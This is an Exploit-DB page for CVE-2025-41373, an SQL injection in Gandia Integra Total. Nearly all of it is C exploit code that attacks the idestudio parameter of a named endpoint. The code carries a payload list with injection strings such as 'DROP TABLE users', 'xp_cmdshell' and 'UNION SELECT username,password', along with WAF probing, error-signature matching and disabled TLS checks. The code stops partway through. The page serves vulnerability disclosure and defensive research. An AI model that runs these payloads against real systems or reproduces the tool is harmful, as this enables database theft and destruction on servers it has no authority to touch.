---
title: [webapps] Gandia Integra Total 4.4.2236.1 - SQL Injection
url: https://www.exploit-db.com/exploits/52388
source: Exploit-DB.com RSS Feed
date: 2025-08-04
fetch_date: 2025-10-07T00:15:17.240271
---

# [webapps] Gandia Integra Total 4.4.2236.1 - SQL Injection

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Gandia Integra Total 4.4.2236.1 - SQL Injection

#### EDB-ID:

###### 52388

#### CVE:

###### [2025-41373](https://nvd.nist.gov/vuln/detail/CVE-2025-41373)

---

**EDB Verified:**

#### Author:

###### [Byte Reaper](/?author=12304)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [Multiple](/?platform=multiple)

#### Date:

###### 2025-08-03

---

**Vulnerable App:**

```
/*
 * Author        : Byte Reaper
 * CVE           : CVE-2025-41373
 * Vulnerability : SQL
 * Affected Path : /encuestas/integraweb_v4/integra/html/view/hislistadoacciones.php?idestudio=<input>
 * Affected Versions : 2.1.2217.3 to v4.4.2236.1
 * Description:
 *   This endpoint concatenates the `idestudio` parameter directly into an SQL query
 *   without proper sanitization or parameterization, allowing an attacker to inject
 *   arbitrary SQL. We leverage both boolean-based and time-based techniques to detect.
*/

#include <stdio.h>
#include <string.h>
#include <curl/curl.h>
#include "argparse.h"
#include <stdlib.h>
#include <time.h>
#include <unistd.h>

#define FULL_URL 4300
int verbose = 0;
int useC = 0;
const char *url = NULL;

const char *cookies = NULL;

void sleepSyscall(void)
{
    struct timespec sleepR;
    sleepR.tv_sec  = 1;
    sleepR.tv_nsec = 0;

    __asm__ volatile
    (
        "mov $35, %%rax\n\t"
        "mov %0, %%rdi\n\t"
        "xor %%rsi, %%rsi\n\t"
        "syscall\n\t"
        :
        : "r" (&sleepR)
        : "rax",
          "rdi",
          "rsi",
          "rcx",
          "r11",
          "memory"
    );
}

void exitAssembly(void )
{
    __asm__ volatile
    (
        "xor %%rdi, %%rdi\n\t"
        "mov $0x3C, %%rax\n\t"
        "syscall\n\t"
        :
        :
        : "rax",
          "rdi"
    );
}

void uid(void)
{
    const char *mes1 = "\e[1;36m[+] Run Exploit Root Successfully\e[0m\n";
    size_t len1 = strlen(mes1);
    const char *mes2 = "\e[1;31m[-] Please Run Exploit In Root, Exit...\e[0m\n";
    size_t len2  = strlen(mes2);

    __asm__ volatile(
        "mov $107, %%rax\n\t"
        "syscall\n\t"
        "cmp $0, %%rax\n\t"
        "JZ .root\n\t"
        "jmp .not_root\n\t"
        ".root:\n\t"
        "mov $1, %%rax\n\t"
        "mov $1, %%rdi\n\t"
        "mov %[mes1], %%rsi\n\t"
        "mov %[len1], %%rdx\n\t"
        "syscall\n\t"
        "jmp .end\n\t"
        ".not_root:\n\t"
        "mov $1, %%rax\n\t"
        "mov $1, %%rdi\n\t"
        "mov %[mes2], %%rsi\n\t"
        "mov %[len2], %%rdx\n\t"
        "syscall\n\t"

        ".end:\n\t"
        :
        : [mes1] "r" (mes1),
          [len1] "r" (len1),
          [mes2] "r" (mes2),
          [len2] "r" (len2)
        : "rax",
          "rdi",
          "rsi",
          "rdx",
          "rcx",
          "r11",
          "memory"
    );
}
const char *payload[] =
{
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR 1=1 --",
    "\" OR 1=1 --",
    "' OR '1'='1' --",
    "' OR 1=1#",
    "' OR 1=1/*",
    "admin'--",
    "admin' #",
    "admin'/*",
    "' OR 1=1-- -",
    "' OR/**/1=1--",
    "'/**/OR/**/1=1#",
    "' OR%%201=1--",
    "' OR%%091=1--",
    "' OR%0a1=1--",
    "' OR%%0b1=1--",
    "' oR 1=1--",
    "' Or 1=1--",
    "' oR/**/1=1--",
    "' OR 0x31=0x31--",
    "1; DROP TABLE users --",
    "1; EXEC xp_cmdshell('dir') --",
    "UNION SELECT NULL,NULL,NULL --",
    "UNION SELECT username,password FROM users --",
    "' UNION SELECT NULL,NULL,NULL --",
    "' UNION SELECT NULL,NULL,NULL#",
    ",(select * from (select(sleep(4)))a)",
    "';WAITFOR DELAY '0:0:4'--",

    NULL
};

const char *word[] =
{
    "SQL syntax",
    "syntax error",
    "mysql_fetch",
    "mysql_num_rows",
    "You have an error in your SQL syntax",
    "Warning: mysql",
    "Warning: pg_",
    "Unclosed quotation mark",
    "Microsoft OLE DB Provider for SQL Server",
    "Microsoft SQL Native Client error",
    "ODBC SQL Server Driver",
    "ORA-01756",
    "ORA-00933",
    "SQLSTATE",
    "PDOException",
    "invalid query",
    "mysql_numrows()",
    "mysql_result()",
    "mysql_query()",
    "Query failed",
    "Syntax error",
    "DB error",
    "error in your SQL syntax",
    "Unexpected end of SQL command",
    "Incorrect syntax near",
    "user",
    "admin",
    NULL
};

struct Mem
{
    char *buffer;
    size_t len;
};
size_t write_cb(void *ptr, size_t size, size_t nmemb, void *userdata)
{
    size_t total = size * nmemb;
    struct Mem *m = (struct Mem *)userdata;
    char *tmp = realloc(m->buffer, m->len + total + 1);
    if (tmp == NULL)
    {
        printf("\e[1;31m[-] Failed to allocate memory!\e[0m\n");
        exitAssembly();
    }
    m->buffer = tmp;
    memcpy(&(m->buffer[m->len]), ptr, total);
    m->len += total;
    m->buffer[m->len] = '\0';
    return total;
}
void clean(char *buffer, size_t len, CURL *curl,char *encode )
{
    free(buffer);
    buffer = NULL;
    len = 0;
    curl_easy_cleanup(curl);
    curl_free(encode);
}
int waf = 0;
int wafD(const char *urlW)
{

    CURL *curl = curl_easy_init();
    CURLcode res;
    struct Mem wafServer;
    wafServer.buffer= NULL;
    wafServer.len = 0;
    const char *payloadSql = "OR 1=1 --";
    char *encode = curl_easy_escape(curl,
         payloadSql,
          strlen(payloadSql));
    char full[FULL_URL];
    if (!encode)
    {
        printf("\e[1;31m[-] Error Encode Payload !\e[0m\n");
        clean(wafServer.buffer,
             wafServer.len,
             curl,
             encode);
        exitAssembly();
    }
    int len = snprintf(full,
        sizeof(full),
         "%s/encuestas/integraweb_v4/integra/html/view/hislistadoacciones.php?idestudio=%s",
         urlW,
         encode);
    if (len < 0 || (size_t)len >= sizeof(full))
    {
        printf("\e[1;31m[-] FULL URL Is Long \n");
        clean(wafServer.buffer, wafServer.len,curl,encode);
        exitAssembly();
    }
    if (curl == NULL || !curl)
    {
        printf("\e[1;31m[-] Error Create Object CURL !\e[0m\n");
        clean(wafServer.buffer,
            wafServer.len,
            curl,
            encode);
        exitAssembly();
    }
    int result = 0;
    if (curl)
    {
        printf("\e[1;35m===========================================================================================\e[0m\n");
        printf("\e[1;35m[+] Scan WAF Start...\e[0m\n");
        printf("\e[1;37m[+] FULL URL : %s\e[0m\n", full);
        curl_easy_setopt(curl,
            CURLOPT_URL,
            full);
        curl_easy_setopt(curl,
                CURLOPT_FOLLOWLOCATION,
                1L);
        curl_easy_setopt(curl,
                CURLOPT_WRITEFUNCTION,
                write_cb);
        if (verbose)
        {
            printf("\e[1;35m------------------------------------------[Verbose Curl]------------------------------------------\e[0m\n");
            curl_easy_setopt(curl,
                    CURLOPT_VERBOSE,
                    1L);
        }
        curl_easy_setopt(curl,
                    CURLOPT_WRITEDATA,
                    &wafServer);
        curl_easy_setopt(curl,
                     CURLOPT_CONNECTTIMEOUT,
                     5L);
        sleepSyscall();
        curl_easy_setopt(curl,
                    CURLOPT_TIMEOUT,
                    10L);
        curl_easy_setopt(curl,
                    CURLOPT_SSL_VERIFYPEER,
                    0L);
        curl_easy_setopt(curl,
                CURLOPT_SSL_VERIFYHOST,
             0L);
        struct curl_sli...